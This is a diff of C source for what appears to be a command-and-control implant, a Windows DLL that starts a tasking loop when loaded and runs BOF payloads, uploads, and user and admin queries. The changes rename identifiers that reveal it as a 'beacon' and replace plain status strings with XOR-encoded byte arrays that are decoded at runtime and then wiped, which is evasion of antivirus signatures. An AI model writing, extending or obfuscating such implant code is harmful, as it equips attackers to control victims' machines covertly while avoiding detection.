@@ -402,7 +402,7 @@ static void handle_whoami(char *out_b64) {
     char buf[512], user[128], host[128];
     get_username(user, sizeof(user));
     get_hostname(host, sizeof(host));
-    BOOL admin = BeaconIsAdmin();
+    BOOL admin = BdIsAdmin();
     snprintf(buf, sizeof(buf), "%s\\%s%s", host, user, admin ? " [ADMIN]" : "");
     b64_encode((unsigned char*)buf, strlen(buf), out_b64);
 }
@@ -450,8 +450,10 @@ static void handle_cd(const char *path, char *out_b64) {
    Args are base64-encoded: <bof_b64> [args_b64] */
 static void handle_bof(const char *args, char *out_b64) {
     if (!args || !args[0]) {
-        const char *msg = "Usage: bof <base64_obj> [base64_args]";
-        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+        unsigned char _em[] = {0x1e,0x38,0x2a,0x2c,0x2e,0x71,0x6b,0x29,0x24,0x2d,0x6b,0x77,0x29,0x2a,0x38,0x2e,0x7d,0x7f,0x14,0x24,0x29,0x21,0x75,0x6b,0x10,0x29,0x2a,0x38,0x2e,0x7d,0x7f,0x14,0x2a,0x39,0x2c,0x38,0x16,0x00};
+        for (int _i=0;_em[_i];_i++) _em[_i]^=0x4B;
+        b64_encode(_em, 37, out_b64);
+        SecureZeroMemory(_em,sizeof(_em));
         return;
     }
 
@@ -472,7 +474,12 @@ static void handle_bof(const char *args, char *out_b64) {
     unsigned char *bof_data = (unsigned char*)malloc(BUF_SIZE);
     if (!bof_data) { b64_encode((unsigned char*)"out of memory", 13, out_b64); return; }
     int bof_len = b64_decode(bof_b64, bof_data, BUF_SIZE);
-    if (bof_len <= 0) { free(bof_data); b64_encode((unsigned char*)"invalid BOF data", 16, out_b64); return; }
+    if (bof_len <= 0) {
+        unsigned char _ev[] = {0x22,0x25,0x3d,0x2a,0x27,0x22,0x2f,0x6b,0x9,0x4,0xd,0x6b,0x2f,0x2a,0x3f,0x2a,0x00};
+        for (int _i=0;_ev[_i];_i++) _ev[_i]^=0x4B;
+        free(bof_data); b64_encode(_ev, 16, out_b64);
+        SecureZeroMemory(_ev,sizeof(_ev)); return;
+    }
 
     /* Decode args */
     unsigned char *bof_args = NULL;
@@ -490,7 +497,12 @@ static void handle_bof(const char *args, char *out_b64) {
     if (bof_out_len > 0)
         b64_encode((unsigned char*)bof_output, bof_out_len, out_b64);
     else
-        b64_encode((unsigned char*)"[BOF executed, no output]", 25, out_b64);
+        {
+            unsigned char _en[] = {0x10,0x9,0x4,0xd,0x6b,0x2e,0x33,0x2e,0x28,0x3e,0x3f,0x2e,0x2f,0x67,0x6b,0x25,0x24,0x6b,0x24,0x3e,0x3f,0x3b,0x3e,0x3f,0x16,0x00};
+            for (int _i=0;_en[_i];_i++) _en[_i]^=0x4B;
+            b64_encode(_en, 25, out_b64);
+            SecureZeroMemory(_en,sizeof(_en));
+        }
 
     free(bof_data);
     if (bof_args) free(bof_args);
@@ -501,7 +513,7 @@ static void handle_getuid(char *out_b64) {
     char buf[256], user[128];
     get_username(user, sizeof(user));
     snprintf(buf, sizeof(buf), "%s (PID: %d, Admin: %s)",
-             user, get_pid(), BeaconIsAdmin() ? "Yes" : "No");
+             user, get_pid(), BdIsAdmin() ? "Yes" : "No");
     b64_encode((unsigned char*)buf, strlen(buf), out_b64);
 }
 
@@ -577,7 +589,7 @@ static void handle_upload(const char *args, char *out_b64) {
 
 /* ── Multi-task JSON parser ─────────────────────────────── */
 
-#define MAX_TASKS_PER_BEACON 16
+#define MAX_TASKS_PER_POLL 16
 
 typedef struct {
     char id[128];
@@ -637,7 +649,7 @@ static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
 
 /* ── Beacon Loop ─────────────────────────────────────────── */
 
-static DWORD WINAPI run_beacon(LPVOID unused) {
+static DWORD WINAPI agent_loop(LPVOID unused) {
     (void)unused;
 
     /*
@@ -783,8 +795,8 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
         }
 
         /* Parse all pending tasks from (already-decrypted) response */
-        parsed_task tasks[MAX_TASKS_PER_BEACON];
-        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_BEACON);
+        parsed_task tasks[MAX_TASKS_PER_POLL];
+        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_POLL);
         if (task_count == 0) goto do_sleep;
 
         /* Allocate results buffer for all tasks */
@@ -957,13 +969,13 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     (void)lpReserved;
     if (reason == DLL_PROCESS_ATTACH) {
         g_own_module = hModule;
-        CreateThread(NULL, 0, run_beacon, NULL, 0, NULL);
+        CreateThread(NULL, 0, agent_loop, NULL, 0, NULL);
     }
     return TRUE;
 }
 #else
 int main(void) {
-    run_beacon(NULL);
+    agent_loop(NULL);
     return 0;
 }
 #endif
